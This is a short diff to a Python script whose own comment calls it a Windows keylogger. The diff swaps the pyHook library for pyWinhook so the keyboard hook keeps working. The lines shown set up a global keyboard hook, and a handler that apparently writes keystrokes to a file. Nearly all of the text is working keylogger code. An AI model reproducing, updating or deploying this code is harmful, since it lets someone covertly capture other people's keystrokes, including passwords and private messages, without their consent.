@@ -2,7 +2,7 @@
 # Python code for keylogger 
 # to be used in windows 
 import win32console 
-import pythoncom, pyHook 
+import pythoncom, pyWinhook 
 import os, sys
 win = win32console.GetConsoleWindow()
 def OnKeyboardEvent(event): 
@@ -24,7 +24,7 @@ def OnKeyboardEvent(event):
         f.close()
     return 1
 # create a hook manager object 
-hm = pyHook.HookManager() 
+hm = pyWinhook.HookManager() 
 hm.KeyDown = OnKeyboardEvent 
 # set the hook 
 hm.HookKeyboard() 
